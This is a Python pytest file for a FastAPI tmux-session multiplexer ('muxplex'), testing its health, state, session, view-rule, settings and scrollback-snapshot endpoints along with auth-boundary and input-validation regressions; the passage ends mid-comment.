"""
Tests for muxplex/main.py — FastAPI skeleton, lifespan, /health endpoint.
"""

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from muxplex.main import app

# ---------------------------------------------------------------------------
# autouse fixture — redirect state/PID files, mock startup side-effects
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def patch_startup_and_state(tmp_path, monkeypatch):
    """Redirect state/socket dir to tmp_path, mock the ttyd startup reapers
    and socket-dir validation, replace _poll_loop with no-op."""
    # Redirect state files
    tmp_state_dir = tmp_path / "state"
    tmp_state_path = tmp_state_dir / "state.json"
    monkeypatch.setattr("muxplex.state.STATE_DIR", tmp_state_dir)
    monkeypatch.setattr("muxplex.state.STATE_PATH", tmp_state_path)

    # Redirect the per-session ttyd socket dir
    tmp_socket_dir = tmp_path / "ttyd"
    monkeypatch.setattr("muxplex.ttyd.TTYD_SOCKET_DIR", tmp_socket_dir)

    # Mock the startup reapers/validation so tests don't touch real processes
    # or the real filesystem validation path (must be async where noted).
    async def _mock_reap_orphan():
        return 0

    async def _mock_reap_legacy():
        return False

    monkeypatch.setattr("muxplex.main.reap_orphan_ttyds", _mock_reap_orphan)
    monkeypatch.setattr("muxplex.main.reap_legacy_ttyd", _mock_reap_legacy)
    monkeypatch.setattr("muxplex.main.ttyd_mod.validate_socket_dir", lambda d: None)

    # Replace _poll_loop with a no-op so tests don't spin up real poll cycles
    async def noop_poll_loop() -> None:
        pass

    monkeypatch.setattr("muxplex.main._poll_loop", noop_poll_loop)


@pytest.fixture(autouse=True)
def reset_federation_cache():
    """Clear _federation_cache before and after each test.

    The module-level _federation_cache persists across tests in the same process,
    causing cross-test contamination: a test that populates the cache for remoteId=0
    causes a later test (also using remoteId=0) to get stale cached data instead of
    the expected unreachable status. _federation_devices_cache (Step 6's
    GET /api/federation/devices) is a separate module-level dict with the
    exact same cross-test-contamination risk, so it is cleared alongside.
    """
    import muxplex.main as main_mod

    main_mod._federation_cache.clear()
    main_mod._federation_devices_cache.clear()
    main_mod._federation_breaker.reset()
    yield
    main_mod._federation_cache.clear()
    main_mod._federation_devices_cache.clear()
    main_mod._federation_breaker.reset()


# ---------------------------------------------------------------------------
# Client fixture — TestClient with lifespan enabled
# ---------------------------------------------------------------------------


@pytest.fixture
def client(monkeypatch):
    """Return a TestClient that triggers the app lifespan on entry/exit.

    Sets a valid session cookie so existing tests bypass the AuthMiddleware
    (TestClient uses host='testclient', which is not a localhost address).
    """
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    with TestClient(app) as c:
        from muxplex.auth import create_session_cookie
        from muxplex.main import _auth_secret, _auth_ttl

        cookie = create_session_cookie(_auth_secret, _auth_ttl)
        c.cookies.set("muxplex_session", cookie)
        yield c


def _mock_run_tmux_for_bell_hook(*, register_side_effect: Exception | None = None):
    """Build a ``run_tmux`` replacement for tests exercising ``_arm_bell_hook()``.

    ``_arm_bell_hook()`` makes exactly ONE tmux call: register (``set-hook``).
    There is no arm-time delivery probe (removed -- see AGENTS.md's "never
    render to a pane" rule and its bell-hook section) and therefore no second
    ``run-shell`` call to simulate here.

    Args:
        register_side_effect: if given, raised on the registration call
            instead of succeeding.
    """

    async def _run_tmux(*args):
        if register_side_effect is not None:
            raise register_side_effect
        return ""

    return _run_tmux


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_health_returns_200(client):
    """GET /health must return HTTP 200."""
    response = client.get("/health")
    assert response.status_code == 200


def test_health_returns_ok_status(client):
    """GET /health must return JSON body {status: 'ok'}."""
    response = client.get("/health")
    assert response.json() == {"status": "ok"}


# ---------------------------------------------------------------------------
# GET /api/state
# ---------------------------------------------------------------------------


def test_get_state_returns_full_state(client):
    """GET /api/state must return a dict with all 4 top-level keys."""
    response = client.get("/api/state")
    assert response.status_code == 200
    data = response.json()
    assert "active_session" in data
    assert "session_order" in data
    assert "sessions" in data
    assert "devices" in data


def test_get_state_active_session_is_none_initially(client):
    """GET /api/state active_session must be None on a fresh state."""
    response = client.get("/api/state")
    assert response.status_code == 200
    data = response.json()
    assert data["active_session"] is None


# ---------------------------------------------------------------------------
# PATCH /api/state
# ---------------------------------------------------------------------------


def test_patch_state_updates_session_order(client):
    """PATCH /api/state updates session_order and persists the change."""
    from muxplex.state import load_state, save_state

    # Write initial state with a known session order
    initial_state = {
        "active_session": None,
        "session_order": ["alpha", "beta"],
        "sessions": {},
        "devices": {},
    }
    save_state(initial_state)

    # Patch with reversed order
    response = client.patch("/api/state", json={"session_order": ["beta", "alpha"]})
    assert response.status_code == 200
    data = response.json()
    assert data["session_order"] == ["beta", "alpha"]

    # Verify the update was persisted to disk
    persisted = load_state()
    assert persisted["session_order"] == ["beta", "alpha"]


def test_patch_state_rejects_non_list_session_order(client):
    """PATCH /api/state rejects non-list session_order with HTTP 422."""
    response = client.patch("/api/state", json={"session_order": "not-a-list"})
    assert response.status_code == 422


def test_patch_state_updates_active_remote_id(client):
    """PATCH /api/state with active_remote_id persists it in state."""
    response = client.patch(
        "/api/state",
        json={"active_session": "remote-sess", "active_remote_id": "fed-abc123"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["active_remote_id"] == "fed-abc123"
    assert data["active_session"] == "remote-sess"


def test_patch_state_clears_active_remote_id(client):
    """PATCH /api/state with active_remote_id: null clears it in state."""
    from muxplex.state import save_state

    # Set up initial state with active_remote_id
    initial = {
        "active_session": "remote-sess",
        "active_remote_id": "fed-abc123",
        "session_order": [],
        "sessions": {},
        "devices": {},
    }
    save_state(initial)

    response = client.patch(
        "/api/state",
        json={"active_session": None, "active_remote_id": None},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["active_remote_id"] is None
    assert data["active_session"] is None


def test_patch_state_without_session_order_updates_active_remote_id_only(client):
    """PATCH /api/state without session_order only updates active_remote_id."""
    from muxplex.state import save_state

    initial = {
        "active_session": None,
        "active_remote_id": None,
        "session_order": ["alpha", "beta"],
        "sessions": {},
        "devices": {},
    }
    save_state(initial)

    response = client.patch(
        "/api/state",
        json={"active_remote_id": "fed-xyz"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["active_remote_id"] == "fed-xyz"
    # session_order should be unchanged
    assert data["session_order"] == ["alpha", "beta"]


def test_patch_state_ignores_unknown_fields(client):
    """PATCH /api/state ignores unknown fields in the request body."""
    response = client.patch(
        "/api/state",
        json={"session_order": ["a", "b"], "unknown_field": "should_be_ignored"},
    )
    assert response.status_code == 200
    data = response.json()
    assert "unknown_field" not in data
    assert data["session_order"] == ["a", "b"]


def test_patch_state_sets_active_view(client):
    """PATCH /api/state with active_view persists the value.

    Verifies response contains active_view and subsequent GET returns the value.
    """
    from muxplex.state import load_state

    # PATCH with a specific active_view value
    response = client.patch("/api/state", json={"active_view": "my-view"})
    assert response.status_code == 200
    data = response.json()
    assert data["active_view"] == "my-view"

    # Verify the value persists via GET
    get_response = client.get("/api/state")
    assert get_response.status_code == 200
    get_data = get_response.json()
    assert get_data["active_view"] == "my-view"

    # Also verify it was persisted to disk
    persisted = load_state()
    assert persisted["active_view"] == "my-view"


def test_patch_state_active_view_defaults_to_all(client):
    """GET /api/state returns active_view='all' by default."""
    response = client.get("/api/state")
    assert response.status_code == 200
    data = response.json()
    assert "active_view" in data
    assert data["active_view"] == "all"


def test_get_state_includes_settings_updated_at(client):
    """GET /api/state carries settings_updated_at (mirrors settings.py) so
    pollers can detect a settings/view-membership change via the same poll
    that already carries active_session/active_view -- see main.py get_state().
    """
    response = client.get("/api/state")
    assert response.status_code == 200
    data = response.json()
    assert "settings_updated_at" in data
    assert isinstance(data["settings_updated_at"], float)


def test_get_state_settings_updated_at_changes_after_settings_write(
    client, tmp_path, monkeypatch
):
    """A settings write (PATCH /api/settings, e.g. editing view membership)
    bumps settings_updated_at, and the NEXT GET /api/state reflects the new
    value -- this is the change signal followRemoteViewDefinitions() polls
    for on the frontend.

    Isolates SETTINGS_PATH to a tmp file like every other settings-writing
    test in this file: without it, this test reads/writes whatever
    ~/.config/muxplex/settings.json happens to exist on the machine running
    the suite (on a box that also runs a live muxplex instance, that is the
    LIVE production config). A pre-existing on-disk `views` list longer than
    one entry would trip the destructive-write backstop (views.py) against
    this test's single-view patch and turn the expected 200 into a 409 --
    entirely an artifact of ambient state, not a real product bug.
    """
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    before = client.get("/api/state").json()["settings_updated_at"]

    patch_response = client.patch(
        "/api/settings", json={"views": [{"name": "Focus", "sessions": ["alpha"]}]}
    )
    assert patch_response.status_code == 200

    after = client.get("/api/state").json()["settings_updated_at"]
    assert after > before


def test_get_state_settings_updated_at_not_persisted_in_state_json(client):
    """settings_updated_at is merged into the API response at read time --
    it must NOT be written into state.json itself (that's settings.py's
    field). Confirms the two schemas stay decoupled.
    """
    from muxplex.state import load_state

    client.get("/api/state")
    on_disk = load_state()
    assert "settings_updated_at" not in on_disk


# ---------------------------------------------------------------------------
# GET /api/sessions
# ---------------------------------------------------------------------------


def test_get_sessions_returns_list(client, monkeypatch):
    """GET /api/sessions must return a JSON list."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"alpha": "some text"})

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert isinstance(items, list)
    assert items[0]["name"] == "alpha"


def test_get_sessions_each_item_has_required_fields(client, monkeypatch):
    """Each item in GET /api/sessions must have name, snapshot, and bell fields."""
    from muxplex.state import save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["beta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"beta": "output"})
    save_state(
        {
            "active_session": None,
            "session_order": ["beta"],
            "sessions": {
                "beta": {
                    "bell": {"last_fired_at": None, "seen_at": None, "unseen_count": 0}
                }
            },
            "devices": {},
        }
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    item = items[0]
    assert "name" in item
    assert "snapshot" in item
    assert "bell" in item


def test_get_sessions_includes_snapshot_text(client, monkeypatch):
    """GET /api/sessions snapshot field must contain the cached capture-pane text."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["gamma"])
    monkeypatch.setattr(
        "muxplex.main.get_snapshots",
        lambda: {"gamma": "hello from tmux pane"},
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["name"] == "gamma"
    assert items[0]["snapshot"] == "hello from tmux pane"


def test_get_sessions_includes_bell_state(client, monkeypatch):
    """GET /api/sessions bell field must include unseen_count from persistent state."""
    from muxplex.state import save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["delta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"delta": "pane text"})
    save_state(
        {
            "active_session": None,
            "session_order": ["delta"],
            "sessions": {
                "delta": {
                    "bell": {
                        "last_fired_at": 1234567890.0,
                        "seen_at": None,
                        "unseen_count": 3,
                    }
                }
            },
            "devices": {},
        }
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["bell"]["unseen_count"] == 3


def test_get_sessions_returns_empty_list_when_no_sessions(client, monkeypatch):
    """GET /api/sessions must return an empty list when there are no sessions."""
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    response = client.get("/api/sessions")
    assert response.status_code == 200


# ---------------------------------------------------------------------------
# GET /api/sessions -- `views` annotation (docs/plans/2026-08-04-auto-views-plan.md §11.3)
# ---------------------------------------------------------------------------


def test_get_sessions_every_entry_carries_views(client, monkeypatch, tmp_path):
    """Every session dict from GET /api/sessions carries a `views` list --
    manual-only config: unchanged apart from the new key."""
    from muxplex.settings import save_settings

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)
    save_settings({"views": [{"name": "Work", "sessions": []}]})

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 2
    for item in items:
        assert "views" in item
        assert item["views"] == []


def test_get_sessions_rule_matching_session_lists_the_view(client, monkeypatch):
    from muxplex.settings import save_settings

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["amplifier-foo", "unrelated"]
    )
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)
    save_settings(
        {"views": [{"name": "Auto", "sessions": [], "match_names": ["amplifier-*"]}]}
    )

    response = client.get("/api/sessions")
    items = {item["name"]: item for item in response.json()}
    assert items["amplifier-foo"]["views"] == ["Auto"]
    assert items["unrelated"]["views"] == []


# ---------------------------------------------------------------------------
# GET /api/federation/sessions -- `views` annotation
# ---------------------------------------------------------------------------


def test_federation_sessions_local_and_remote_annotated(client, monkeypatch, tmp_path):
    from muxplex.settings import save_settings

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["amplifier-local"])
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    save_settings(
        {
            "views": [{"name": "Auto", "sessions": [], "match_names": ["amplifier-*"]}],
            "remote_instances": [],
        }
    )

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["views"] == ["Auto"]


def test_federation_sessions_cache_not_baked_with_stale_membership(
    client, monkeypatch, tmp_path
):
    """After one call with a rule view, mutating settings to remove the rule
    must be reflected on the NEXT call -- proving nothing was baked into
    _federation_cache (the annotate-the-merged-list-only guarantee)."""
    import httpx

    from muxplex.settings import save_settings

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)

    async def fake_get(self, url, headers=None, timeout=None):
        request = httpx.Request("GET", url)
        return httpx.Response(
            200,
            json=[{"name": "amplifier-remote", "snapshot": "", "bell": {}}],
            request=request,
        )

    monkeypatch.setattr(httpx.AsyncClient, "get", fake_get)

    save_settings(
        {
            "views": [{"name": "Auto", "sessions": [], "match_names": ["amplifier-*"]}],
            "remote_instances": [
                {
                    "name": "peer",
                    "url": "http://peer.example",
                    "key": "k",
                    "device_id": "peer-1",
                }
            ],
        }
    )

    first = client.get("/api/federation/sessions").json()
    remote_item = next(s for s in first if s.get("name") == "amplifier-remote")
    assert remote_item["views"] == ["Auto"]

    # Remove the rule -- the cached `tagged` list must not have baked in
    # the old membership answer.
    save_settings(
        {
            "views": [{"name": "Auto", "sessions": []}],
            "remote_instances": [
                {
                    "name": "peer",
                    "url": "http://peer.example",
                    "key": "k",
                    "device_id": "peer-1",
                }
            ],
        }
    )
    second = client.get("/api/federation/sessions").json()
    remote_item2 = next(s for s in second if s.get("name") == "amplifier-remote")
    assert remote_item2["views"] == []


# ---------------------------------------------------------------------------
# GET /api/view with a rule-based active_view -- handler unchanged
# ---------------------------------------------------------------------------


def test_get_view_rule_based_view_resolves_with_no_handler_change(client, monkeypatch):
    from muxplex.settings import save_settings
    from muxplex.state import save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["amplifier-foo", "unrelated"]
    )
    save_settings(
        {"views": [{"name": "Auto", "sessions": [], "match_names": ["amplifier-*"]}]}
    )
    save_state(
        {
            "active_view": "Auto",
            "active_session": None,
            "active_remote_id": None,
            "session_order": ["amplifier-foo", "unrelated"],
            "sessions": {},
            "devices": {},
        }
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    body = response.json()
    assert [s["name"] for s in body["sessions"]] == ["amplifier-foo"]
    # /api/view's session entries do NOT carry `views` (§4 item 2).
    assert "views" not in body["sessions"][0]


# ---------------------------------------------------------------------------
# GET /api/views -- resolution + validation errors
# ---------------------------------------------------------------------------


def test_get_views_shape_and_valid_patterns_only(client, monkeypatch):
    from muxplex.settings import save_settings

    save_settings(
        {
            "views": [
                {
                    "name": "Amplifier",
                    "sessions": ["dev1:pinned"],
                    "match_names": ["amplifier-*", "bad:pattern"],
                }
            ]
        }
    )

    response = client.get("/api/views")
    assert response.status_code == 200
    body = response.json()
    assert body["views"][0]["name"] == "Amplifier"
    assert body["views"][0]["sessions"] == ["dev1:pinned"]
    assert body["views"][0]["match_names"] == ["amplifier-*"]
    assert len(body["views"][0]["errors"]) == 1
    assert len(body["errors"]) == 1


def test_get_views_clean_config_returns_no_errors(client, monkeypatch):
    from muxplex.settings import save_settings

    save_settings({"views": [{"name": "V", "sessions": [], "match_names": ["a-*"]}]})
    response = client.get("/api/views")
    body = response.json()
    assert body["errors"] == []
    assert body["views"][0]["errors"] == []


def test_get_views_requires_auth():
    """Not in auth._AUTH_EXEMPT_PATHS -- same convention as
    test_get_session_commands_requires_auth (GET /api/views resolves
    view rules, disclosing config an unauthenticated caller should not see)."""
    from muxplex.auth import _AUTH_EXEMPT_PATHS

    assert "/api/views" not in _AUTH_EXEMPT_PATHS


# ---------------------------------------------------------------------------
# POST /api/views/preview -- the rule editor's live-match preview (§9.3)
# ---------------------------------------------------------------------------


def test_preview_view_rule_matches_live_sessions(client, monkeypatch):
    monkeypatch.setattr(
        "muxplex.main.get_session_list",
        lambda: ["amplifier-foo", "amplifier-bar", "unrelated"],
    )

    response = client.post("/api/views/preview", json={"match_names": ["amplifier-*"]})
    assert response.status_code == 200
    body = response.json()
    assert body["errors"] == []
    assert sorted(body["matches"]) == ["amplifier-bar", "amplifier-foo"]


def test_preview_view_rule_empty_patterns_returns_no_matches_no_errors(
    client, monkeypatch
):
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["foo", "bar"])

    response = client.post("/api/views/preview", json={"match_names": []})
    assert response.status_code == 200
    body = response.json()
    assert body == {"errors": [], "matches": []}


def test_preview_view_rule_colon_pattern_names_the_reason(client, monkeypatch):
    """The non-negotiable from AGENTS.md/the spec: a pattern containing ':'
    can never match (the device qualifier is a UUID), so the editor's
    preview call must name that reason -- not just silently match nothing.
    """
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["spark-1-foo"])

    response = client.post("/api/views/preview", json={"match_names": ["spark-1:*"]})
    assert response.status_code == 200
    body = response.json()
    assert len(body["errors"]) == 1
    assert "':'" in body["errors"][0]
    assert body["matches"] == []  # the invalid pattern is excluded from matching


def test_preview_view_rule_mixes_valid_and_invalid_patterns(client, monkeypatch):
    """One invalid pattern excludes only itself -- a sibling valid pattern in
    the same draft still matches (mirrors view_patterns()'s per-pattern
    exclusion, exercised here through the preview endpoint)."""
    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["amplifier-foo", "other"]
    )

    response = client.post(
        "/api/views/preview",
        json={"match_names": ["amplifier-*", "bad:pattern", ""]},
    )
    body = response.json()
    assert len(body["errors"]) == 2  # the ':' pattern and the empty string
    assert body["matches"] == ["amplifier-foo"]


def test_preview_view_rule_never_writes_settings(client, monkeypatch):
    """The preview endpoint is read-only -- calling it must never touch
    settings.json, even with a garbage draft."""
    from muxplex.settings import save_settings

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["foo"])
    save_settings({"views": [{"name": "V", "sessions": ["dev1:foo"]}]})
    before = client.get("/api/settings").json()["views"]

    client.post("/api/views/preview", json={"match_names": ["bad:pattern", "x-*"]})

    after = client.get("/api/settings").json()["views"]
    assert after == before


def test_preview_view_rule_requires_auth():
    """Same convention as GET /api/views -- session data (which local
    sessions match a draft pattern) is not for an unauthenticated caller."""
    from muxplex.auth import _AUTH_EXEMPT_PATHS

    assert "/api/views/preview" not in _AUTH_EXEMPT_PATHS


# ---------------------------------------------------------------------------
# PATCH /api/settings -- malformed view rule (400, invalid_view_rule)
# ---------------------------------------------------------------------------


def test_patch_settings_malformed_view_rule_returns_400(client, monkeypatch):
    from muxplex.settings import save_settings

    save_settings({"views": [{"name": "V", "sessions": []}]})

    response = client.patch(
        "/api/settings",
        json={"views": [{"name": "V", "sessions": [], "match_names": ["bad:x"]}]},
    )
    assert response.status_code == 400
    body = response.json()
    assert body["invalid_view_rule"] is True
    assert len(body["errors"]) > 0

    # No write happened.
    settings_response = client.get("/api/settings")
    assert settings_response.json()["views"] == [{"name": "V", "sessions": []}]


# ---------------------------------------------------------------------------
# GET /api/sessions/{name} -- caller-controlled read depth (scrollback fix)
# ---------------------------------------------------------------------------


def test_get_session_snapshot_returns_live_capture(client, monkeypatch):
    """GET /api/sessions/{name} does a live capture_pane_window(), not the cache."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    captured_args = []

    async def fake_capture_pane_window(name: str, s: int, e: int | None):
        captured_args.append((name, -s, e))
        return (500, 24, 50000, "line1\nline2\n...\nline500\n")

    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_capture_pane_window)

    response = client.get("/api/sessions/alpha?lines=500")
    assert response.status_code == 200
    body = response.json()
    assert body["name"] == "alpha"
    assert body["lines"] == 500
    assert body["snapshot"] == "line1\nline2\n...\nline500\n"
    assert captured_args == [("alpha", 500, None)]
    # New scrollback-paging fields (docs/plans/2026-08-07-scrollback-paging-plan.md §3.3):
    # h=500 >= lines=500, so start=0 (the top of all available history).
    assert body["start"] == 0
    assert body["row_count"] == 524  # total (500+24) - start
    assert body["total"] == 524
    assert body["has_more"] is False
    assert body["saturated"] is False


def test_get_session_snapshot_defaults_to_default_capture_lines(client, monkeypatch):
    """Omitting ?lines= must preserve the original 30-line default -- unchanged shape."""
    from muxplex.sessions import DEFAULT_CAPTURE_LINES

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    captured_args = []

    async def fake_capture_pane_window(name: str, s: int, e: int | None):
        captured_args.append((name, -s, e))
        return (100, 24, 50000, "")

    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_capture_pane_window)

    response = client.get("/api/sessions/alpha")
    assert response.status_code == 200
    assert response.json()["lines"] == DEFAULT_CAPTURE_LINES
    assert captured_args == [("alpha", DEFAULT_CAPTURE_LINES, None)]


def test_get_session_snapshot_rejects_lines_over_max(client, monkeypatch):
    """?lines= above MAX_CAPTURE_LINES must be a 400, not a silently-clamped 200."""
    from muxplex.sessions import MAX_CAPTURE_LINES

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    response = client.get(f"/api/sessions/alpha?lines={MAX_CAPTURE_LINES + 1}")
    assert response.status_code == 400
    assert "lines" in response.json()["detail"]


def test_get_session_snapshot_rejects_lines_below_one(client, monkeypatch):
    """?lines=0 (or negative) must be a 400."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    response = client.get("/api/sessions/alpha?lines=0")
    assert response.status_code == 400


def test_get_session_snapshot_accepts_max_capture_lines_exactly(client, monkeypatch):
    """The upper bound itself (MAX_CAPTURE_LINES) must be accepted, not rejected."""
    from muxplex.sessions import MAX_CAPTURE_LINES

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_capture_pane_window(name: str, s: int, e: int | None):
        return (MAX_CAPTURE_LINES, 24, 50000, "x" * 10)

    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_capture_pane_window)

    response = client.get(f"/api/sessions/alpha?lines={MAX_CAPTURE_LINES}")
    assert response.status_code == 200
    assert response.json()["lines"] == MAX_CAPTURE_LINES


def test_get_session_snapshot_404_for_unknown_session(client, monkeypatch):
    """An unknown session name -> 404, same fail-closed pattern as connect/delete/input."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    response = client.get("/api/sessions/ghost")
    assert response.status_code == 404


def test_get_session_snapshot_400_for_invalid_name(client, monkeypatch):
    """A name that fails is_valid_session_name must 400 before any lookup."""
    monkeypatch.setattr("muxplex.main.get_session_list", list)

    response = client.get("/api/sessions/-leading-dash")
    assert response.status_code == 400


def test_get_session_snapshot_requires_auth_for_asset_like_name(monkeypatch):
    """Regression: an unauthenticated, non-localhost GET for a session name
    that looks like a static asset (e.g. "probe.js") must be blocked by
    AuthMiddleware (401), not reach this endpoint's own 404.

    Before the fix, AuthMiddleware's static-extension exemption was a bare
    `path.endswith(ext)` with no guard scoping it to the static mount --
    so this exact request reached `get_session_snapshot` and returned its
    OWN 404 ("Session not found") instead of AuthMiddleware's 401. This
    test intentionally does NOT use the `client` fixture (which pre-injects
    a valid session cookie); it builds its own unauthenticated client to
    exercise the real security boundary.
    """
    monkeypatch.setattr("muxplex.main.get_session_list", list)

    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        for name in ("probe.js", "data.json", "site.map", "style.css"):
            response = c.get(
                f"/api/sessions/{name}", headers={"Accept": "application/json"}
            )
            assert response.status_code == 401, (
                f"/api/sessions/{name} should require auth, got "
                f"{response.status_code}: {response.text}"
            )


def test_get_session_snapshot_includes_bell_and_activity(client, monkeypatch):
    """Response shape must match GET /api/sessions's per-item fields (bell, last_activity_at)."""
    from muxplex.state import save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])
    monkeypatch.setattr(
        "muxplex.main.get_session_activity", lambda: {"alpha": 1700000000.0}
    )

    async def fake_capture_pane_window(name: str, s: int, e: int | None):
        return (100, 24, 50000, "pane text")

    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_capture_pane_window)
    save_state(
        {
            "active_session": None,
            "session_order": ["alpha"],
            "sessions": {
                "alpha": {
                    "bell": {
                        "last_fired_at": 1234567890.0,
                        "seen_at": None,
                        "unseen_count": 2,
                    }
                }
            },
            "devices": {},
        }
    )

    response = client.get("/api/sessions/alpha")
    assert response.status_code == 200
    body = response.json()
    assert body["bell"]["unseen_count"] == 2
    assert body["last_activity_at"] == 1700000000.0


def test_get_sessions_includes_last_activity_at(client, monkeypatch):
    """GET /api/sessions must include last_activity_at with the cached
    session-activity epoch timestamp."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["epsilon"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"epsilon": "pane"})
    monkeypatch.setattr(
        "muxplex.main.get_session_activity", lambda: {"epsilon": 1700000000.0}
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["last_activity_at"] == 1700000000.0


def test_get_sessions_last_activity_at_null_when_unknown(client, monkeypatch):
    """GET /api/sessions must return last_activity_at: null for a session
    tmux reported no activity value for, rather than omitting the field."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["zeta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"zeta": "pane"})
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert "last_activity_at" in items[0]
    assert items[0]["last_activity_at"] is None


# ---------------------------------------------------------------------------
# GET /api/sessions -- `created_at` (BACKLOG.md #7 / docs/API_SEMANTICS.md)
# ---------------------------------------------------------------------------


def test_get_sessions_includes_created_at(client, monkeypatch):
    """GET /api/sessions must include created_at with the cached
    tmux #{session_created} epoch timestamp."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["eta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"eta": "pane"})
    monkeypatch.setattr(
        "muxplex.main.get_session_created_times", lambda: {"eta": 1690000000.0}
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["created_at"] == 1690000000.0


def test_get_sessions_created_at_null_when_unknown(client, monkeypatch):
    """GET /api/sessions must return created_at: null for a session tmux
    reported no parseable #{session_created} for, rather than omitting the
    field -- same version-tolerant shape as last_activity_at."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["theta"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"theta": "pane"})
    monkeypatch.setattr("muxplex.main.get_session_created_times", dict)

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert "created_at" in items[0]
    assert items[0]["created_at"] is None


# ---------------------------------------------------------------------------
# GET /api/sessions -- cwd (docs/plans/2026-08-07-agent-surface-additive-plan.md item C)
#
# `cwd` is tmux's #{pane_current_path} for the session's active window's
# active pane, published from the SAME cache get_session_cwds() already
# refreshes every poll cycle (main.py:74/507) -- zero new subprocesses.
# This is how an agent tells which repo a sibling session is working in.
# ---------------------------------------------------------------------------


def test_get_sessions_includes_cwd(client, monkeypatch):
    """GET /api/sessions must include cwd with the cached
    #{pane_current_path} value for the session."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["iota"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"iota": "pane"})
    monkeypatch.setattr(
        "muxplex.main.get_session_cwds", lambda: {"iota": "/home/you/dev/muxplex"}
    )

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert items[0]["cwd"] == "/home/you/dev/muxplex"


def test_get_sessions_cwd_is_null_when_tmux_reports_none(client, monkeypatch):
    """GET /api/sessions must return cwd: null for a session tmux didn't
    report a parseable #{pane_current_path} for -- key always present,
    same version-tolerant convention as last_activity_at/created_at."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["kappa"])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {"kappa": "pane"})
    monkeypatch.setattr("muxplex.main.get_session_cwds", dict)

    response = client.get("/api/sessions")
    assert response.status_code == 200
    items = response.json()
    assert len(items) == 1
    assert "cwd" in items[0]
    assert items[0]["cwd"] is None


# ---------------------------------------------------------------------------
# GET /api/sessions/{name} -- field parity with the bulk read (item C, §6.4)
#
# The single-session read used to return only {name, snapshot, lines, bell,
# last_activity_at} while the bulk read also carried created_at, followups,
# and views. A polling agent narrowed to one session could not see a
